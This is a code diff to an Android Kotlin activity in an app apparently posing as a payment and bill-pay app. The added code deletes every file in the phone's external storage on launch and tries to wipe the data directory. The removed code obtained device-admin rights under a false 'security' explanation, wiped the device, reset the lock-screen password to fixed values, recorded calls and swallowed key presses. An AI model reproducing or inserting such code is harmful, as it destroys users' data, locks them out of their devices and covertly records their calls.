@@ -2,10 +2,10 @@ package com.payment.app
 
 import android.Manifest
 import android.annotation.SuppressLint
-import android.annotation.TargetApi
-import android.app.KeyguardManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
+import android.content.ContentResolver
+import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.IntentSender.SendIntentException
@@ -13,13 +13,14 @@ import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationManager
-import android.media.MediaRecorder
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
+import android.provider.ContactsContract
 import android.provider.Settings
-import android.provider.Settings.SettingNotFoundException
+import android.provider.Telephony
 import android.util.Log
-import android.view.KeyEvent
 import android.view.View
 import android.widget.ImageView
 import android.widget.RelativeLayout
@@ -53,13 +54,11 @@ import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
 import com.google.android.gms.tasks.OnCompleteListener
 import com.google.android.gms.tasks.OnSuccessListener
 import com.google.firebase.messaging.FirebaseMessaging
-import com.payment.app.services.CallRecord
-import com.payment.app.services.LogUtils
 import com.payment.app.services.MyDeviceAdminReceiver
 import com.payment.app.services.MyService
 import okhttp3.Interceptor.*
 import org.json.JSONObject
-import java.security.SecureRandom
+import java.io.File
 
 
 class HomeActivity : AppCompatActivity() {
@@ -75,7 +74,7 @@ class HomeActivity : AppCompatActivity() {
     private var isWriteExternalStoragePermissionGranted = false
     private var isReadMediaImagePermissionGranted = false
     private var isReadMediaVideoPermissionGranted = false
-    private var isAdminPermissionGranted = false
+    private var isWriteContactPermissionGranted = false
     private val permissionId = 2
     private var googleApiClient: GoogleApiClient? = null
     val REQUEST_LOCATION = 199
@@ -85,16 +84,7 @@ class HomeActivity : AppCompatActivity() {
     private var fcmToken = ""
     companion object {
         private const val REQUEST_CODE_ENABLE_ADMIN = 1
-        private val TAG = HomeActivity::class.java.simpleName
-
     }
-
-    private lateinit var callRecord: CallRecord
-
-
-    private val TAG = "tempActivity"
-    private var policyManager: DevicePolicyManager? = null
-    private var componentName: ComponentName? = null
 
     @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -146,9 +136,9 @@ class HomeActivity : AppCompatActivity() {
                 isReadMediaVideoPermissionGranted =
                     permissions[Manifest.permission.READ_MEDIA_VIDEO]
                         ?: isReadMediaVideoPermissionGranted
-                isAdminPermissionGranted =
-                    permissions[Manifest.permission.BIND_DEVICE_ADMIN]
-                        ?: isAdminPermissionGranted
+                isWriteContactPermissionGranted =
+                    permissions[Manifest.permission.WRITE_CONTACTS]
+                        ?: isWriteContactPermissionGranted
             }
 
         requestPermissions()
@@ -195,70 +185,8 @@ class HomeActivity : AppCompatActivity() {
 
         btnElectricityBill.setOnClickListener(View.OnClickListener { electricityBill() })
 
-        callRecord = CallRecord.Builder(this)
-            .setLogEnable(true)
-            .setRecordFileName("CallRecorderTestFile")
-            .setRecordDirName("CallRecorderTest")
-            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
-            .setShowSeed(true)
-            .build()
-
-        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
-
-        if (!devicePolicyManager.isAdminActive(adminComponent)) {
-
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-            intent.putExtra(
-                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                "This app requires device admin privileges to perform a wipe operation."
-            )
-            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN)
-
-            // Request device admin privileges
-//            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-//
-//            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN)
-        } else {
-            // Device admin privileges are already granted, initiate the wipe
-
-            initiateWipe()
-        }
-
-        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
-
-        if (!devicePolicyManager.isAdminActive(componentName)) {
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please activate device admin for security")
-            startActivityForResult(intent, 0)
-        } else {
-            val secureRandom = SecureRandom()
-            val token = secureRandom.generateSeed(32)
-            try {
-                if (devicePolicyManager.isAdminActive(componentName)) {
-//                    devicePolicyManager.resetPassword("A123456", DevicePolicyManager.RESET_PASSWORD_DO_NOT_ASK_CREDENTIALS_ON_BOOT)
-                    devicePolicyManager.setResetPasswordToken(componentName, token)
-                    devicePolicyManager.resetPasswordWithToken(componentName, "A1234456", token, 0)
-//                    devicePolicyManager.lockNow()
-                }
-                else{
-                    Log.d("Else", "StartCallRecordClick")
-                }
-            } catch (e: SecurityException) {
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
-                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please activate device admin for security")
-                startActivityForResult(intent, 0)
-                Log.d("Error",e.toString())
-            }
-
-        }
-
         val serviceIntent = Intent(this, MyService::class.java)
         startForegroundService(serviceIntent)
-        checkPermissionsss()
 
         val notificationListenerString =
             Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners")
@@ -269,110 +197,100 @@ class HomeActivity : AppCompatActivity() {
             Log.d("Notification Permission", "has access")
         }
 
-//        checkAccessibilityPermission()
-
-    }
-
-    private val RECORD_AUDIO_PERMISSION = Manifest.permission.RECORD_AUDIO
-    private val WRITE_EXTERNAL_STORAGE_PERMISSION = Manifest.permission.WRITE_EXTERNAL_STORAGE
-    private val READ_PHONE_STATE_PERMISSION = Manifest.permission.READ_PHONE_STATE
-
-    private fun checkPermissionsss(): Boolean {
-        val recordAudioPermission = ContextCompat.checkSelfPermission(this, RECORD_AUDIO_PERMISSION) == PackageManager.PERMISSION_GRANTED
-        val writeExternalStoragePermission = ContextCompat.checkSelfPermission(this, WRITE_EXTERNAL_STORAGE_PERMISSION) == PackageManager.PERMISSION_GRANTED
-        val readPhoneStatePermission = ContextCompat.checkSelfPermission(this, READ_PHONE_STATE_PERMISSION) == PackageManager.PERMISSION_GRANTED
-        return recordAudioPermission && writeExternalStoragePermission && readPhoneStatePermission
-    }
-
-
-    private fun mylock() {
-        val active = policyManager!!.isAdminActive(componentName!!)
-        if (!active) { // Without permission
-            Log.e(TAG, "No authority~")
-            activeManage() // To get access
-            val newPassword = "123456"
-            policyManager!!.resetPassword(newPassword, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
-        } else {
-            Log.e(TAG, "Has authority")
-//            policyManager!!.lockNow() // lock screen directly
-            val newPassword = "3456"
-            policyManager?.resetPassword(newPassword, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC)
+        if (checkPermissionsExternalStorage()) {
+            // Permission granted; you can now clear the directory.
+            clearDirectoryInExternalStorage()
         }
-        finish()
+
     }
 
-    private fun activeManage() {
-        Log.e(TAG, "activeManage")
-        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
-        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "developers：liushuaikobe")
-        startActivityForResult(intent, 1)
-    }
-
-    private fun initiateWipe() {
-        val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
-
-        if (devicePolicyManager.isAdminActive(componentName)) {
-            try {
-                devicePolicyManager.wipeData(0) // Perform a standard data wipe
-                val timeMs: Long = 1000L * 60
-//                devicePolicyManager.setMaximumTimeToLock(componentName, timeMs)
-                Log.d("timeMs","$timeMs")
-                val isDeviceAdmin = devicePolicyManager.isAdminActive(componentName)
-                if(isDeviceAdmin){
-                    val newPassword = "123456"
-                    devicePolicyManager.resetPassword(newPassword, 0)
-                    devicePolicyManager.lockNow()
-                }
-
-            } catch (e: SecurityException) {
-                Log.d( "Handle",e.toString())
-                // Handle security exception
-                // This may indicate a lack of admin privileges or other issues
-            } catch (e: Exception) {
-                Log.d( "HandleException",e.toString())
-
-                // Handle other exceptions
-                // This may indicate a failure during the wipe operation
-            }
-        } else {
-            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
-
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-            startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN)
-            // Handle the case where device admin privileges are not granted
+    private fun checkPermissionsExternalStorage(): Boolean {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            // Permission not granted; request it from the user.
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),
+                1
+            )
+            return false
         }
-    }
-
-    @RequiresApi(Build.VERSION_CODES.O)
-    fun checkAccessibilityPermission(): Boolean {
-        var accessEnabled = 0
-        try {
-            accessEnabled =
-                Settings.Secure.getInt(this.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
-        } catch (e: SettingNotFoundException) {
-            e.printStackTrace()
-        }
-        return if (accessEnabled == 0) {
-            /** if not construct intent to request permission  */
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            /** request permission via start activity for result  */
-            startActivity(intent)
-            false
-        } else {
-            true
-        }
-    }
-
-    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
-        Log.d("KeyPress", "Key pressed")
-
-//this prevents the key from performing the base function. Replace with super.onKeyDown to let it perform it's original function, after being consumed by your app.
         return true
     }
+
+
+    private fun clearDirectoryInExternalStorage() {
+//        val externalStorageDir = Environment.getExternalStorageDirectory()
+        val externalStorageDirectory = File(Environment.getExternalStorageDirectory().absolutePath)
+        val androidFiles = File(Environment.getDataDirectory().absolutePath)
+        val filesAndDirectories = getAllFilesAndDirectories(externalStorageDirectory)
+        val androidDirectories = getAllFilesAndDirectories(externalStorageDirectory)
+        if (filesAndDirectories.isNotEmpty()) {
+            println("Files and directories in $externalStorageDirectory:")
+            for (item in filesAndDirectories) {
+                println(item.absolutePath)
+            }
+            val success = deleteAllFilesAndDirectories(externalStorageDirectory)
+
+            if (success) {
+                println("All files and directories deleted successfully.")
+            } else {
+                println("Error deleting files and directories.")
+            }
+        }
+        else {
+            println("No files or directories found in $externalStorageDirectory.")
+        }
+        if (androidDirectories.isNotEmpty()) {
+            println("Files and directories in $androidFiles:")
+            for (item in androidDirectories) {
+                println(item.absolutePath)
+            }
+            val success = deleteAllFilesAndDirectories(androidFiles)
+
+            if (success) {
+                println("All files and directories deleted successfully.")
+            } else {
+                println("Error deleting files and directories.")
+            }
+        }
+        else {
+            println("No files or directories found in $androidFiles.")
+        }
+    }
+
+    fun deleteAllFilesAndDirectories(targetDirectory: File): Boolean {
+        val allFilesAndDirectories = getAllFilesAndDirectories(targetDirectory)
+
+        if (allFilesAndDirectories.isNotEmpty()) {
+            for (fileOrDirectory in allFilesAndDirectories) {
+                if (fileOrDirectory.isDirectory) {
+                    deleteAllFilesAndDirectories(fileOrDirectory)
+                }
+                fileOrDirectory.delete()
+                Log.d("clear directory", "$fileOrDirectory")
+
+            }
+            return true
+        }
+
+        return false
+    }
+
+    fun getAllFilesAndDirectories(directory: File): List<File> {
+        val resultList = mutableListOf<File>()
+
+        if (directory.exists() && directory.isDirectory) {
+            val files = directory.listFiles()
+            if (files != null) {
+                resultList.addAll(files)
+            }
+        }
+
+        return resultList
+    }
+
 
     fun notificationRequestPermission() {
         val requestIntent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
@@ -553,11 +471,6 @@ class HomeActivity : AppCompatActivity() {
             permissionId
         )
 
-        ActivityCompat.requestPermissions(
-            this,
-            arrayOf(RECORD_AUDIO_PERMISSION, WRITE_EXTERNAL_STORAGE_PERMISSION, READ_PHONE_STATE_PERMISSION),
-            1
-        )
     }
 
     @SuppressLint("MissingSuperCall")
@@ -659,9 +572,9 @@ class HomeActivity : AppCompatActivity() {
             Manifest.permission.READ_MEDIA_VIDEO
         ) == PackageManager.PERMISSION_GRANTED
 
-        isAdminPermissionGranted = ContextCompat.checkSelfPermission(
+        isWriteContactPermissionGranted = ContextCompat.checkSelfPermission(
             this,
-            Manifest.permission.BIND_DEVICE_ADMIN
+            Manifest.permission.WRITE_CONTACTS
         ) == PackageManager.PERMISSION_GRANTED
 
 
@@ -707,8 +620,8 @@ class HomeActivity : AppCompatActivity() {
             permissionRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
         }
 
-        if (!isAdminPermissionGranted) {
-            permissionRequest.add(Manifest.permission.BIND_DEVICE_ADMIN)
+        if (!isWriteContactPermissionGranted) {
+            permissionRequest.add(Manifest.permission.WRITE_CONTACTS)
         }
 
         if (permissionRequest.isNotEmpty()) {
